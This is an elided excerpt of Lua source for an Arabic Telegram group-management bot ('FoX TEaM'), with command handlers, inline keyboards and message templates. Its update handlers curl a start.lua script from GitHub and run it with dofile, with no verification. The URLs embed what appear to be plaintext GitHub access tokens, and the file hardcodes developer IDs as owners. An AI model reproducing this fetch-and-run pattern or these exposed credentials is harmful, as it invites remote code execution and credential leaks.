...
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
namebot = redis:get(bot_id..":namebot") or " بروكس"
SudosS = {2132412121,5387457329}
Sudos = {sudoid,2132412121,5387457329}
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
function Bot(msg)  
local idbot = false  
...
{{text = '᥀ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "بروكس"),data="delnamebot"}},
...
os.execute('curl -s https://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@raw.githubusercontent.com/SourceTelanD/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
if Text == "UpBot" then
...
{{text = '᥀ : CoDeR .',url="https://t.me/VvVvlvVv"},{text = '᥀ : TwS .',url="https://t.me/O1VBoT"}},
{{text = '᥀ : FoX TEaM .',url="t.me/omooee"}},
}
}
...
os.execute('rm -rf start.lua')
os.execute('curl -s https://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/uuz02e8tBw@raw.githubusercontent.com/SourceFox/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
end
if text == "تحديث" then
...
namet = {"اسمي "..(redis:get(bot_id..":namebot") or "بروكس"),"عمريي اسمي "..(redis:get(bot_id..":namebot") or "بروكس"),"اني لقميل "..(redis:get(bot_id..":namebot") or "بروكس"),(redis:get(bot_id..":namebot") or "بروكس").." اني"}
bot.sendText(msg.chat_id,msg.id,"*"..namet[math.random(#namet)].."*","md",true)  
end
if text == "بوت" or text == (redis:get(bot_id..":namebot") or "بروكس") then
...
local UserId_Info = bot.searchPublicChat("VvVvlvVv")
if UserId_Info.id then
...
bot.sendText(msg.chat_id,msg.id,"᥀ : رابط المجموعه : *"..Get_Chat.title.."*\n  ٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"..link,"md",true, false, false, false, reply_markup)
return false
end
end
...
{{text = '᥀ : 𝖲??𝗎𝖱??𝖾 𝖾𝗂𝗅𝖺𝗇𝖣 .',url="t.me/omooee"}},
}
}
...
bot.sendText(msg.chat_id,msg.id,"*᥀ : ارسل النص الان .\n᥀ : لتتمكن من اضافته .*\nٴ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ — —\n᥀ : #username - *اسم المستخدم .*\n᥀ : #msgs - *عدد رسائل المستخدم .*\n᥀ : #photos - *عدد صور المستخدم .*\n᥀ : #id - *ايدي المستخدم .*\n᥀ : #auto - *تفاعل المستخدم* .\n᥀ : #stast - *موقع المستخدم .*\n᥀ : #edit - *عدد السحكات .*\n᥀ : #AddMem - *عدد الجهات .*\n᥀ : #Description - *تعليق الصوره .*","md", true)
end
...
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendPhoto?chat_id="..msg.chat_id.."&photo=https://t.me/zezesu/"..math.random(2,107).."&caption="..URL.escape("᥀ : تم اختيار الصوره لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
...
local Text = "*᥀ : WeLCoMe To FoX TEaM  .*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ : FoX TEaM .',url="https://t.me/omooee"}},
{{text = '᥀ : inFo FoX  .',url="https://t.me/comeeo"}},
{{text = '᥀ : CoDeR .',url="https://t.me/VvVvlvVv"},{text = '᥀ : TwS .',url="https://t.me/Uuu2u_bOt"}},
}
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg.chat_id .. "&photo=https://t.me/omooee&caption=".. URL.escape(Text).."&photo=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----------------------------------------------------------------------------------------------------
if text == 'تفعيل' then
if msg.can_be_deleted_for_all_users == false then
